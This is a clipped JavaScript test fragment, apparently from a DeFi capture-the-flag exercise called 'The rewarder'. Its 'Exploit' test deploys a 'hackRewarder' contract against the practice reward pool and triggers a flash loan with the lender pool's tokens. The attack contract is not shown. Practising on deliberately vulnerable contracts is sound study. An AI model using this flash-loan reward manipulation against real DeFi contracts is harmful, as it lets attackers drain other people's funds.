...
describe("[Challenge] The rewarder", function () {
  ...
  it("Exploit", async function () {
    ...
    const hackFactory = await ethers.getContractFactory("hackRewarder");
    const hack = await hackFactory.deploy(this.rewarderPool.address);

    await hack.receiveFlashLoan(TOKENS_IN_LENDER_POOL);
  });
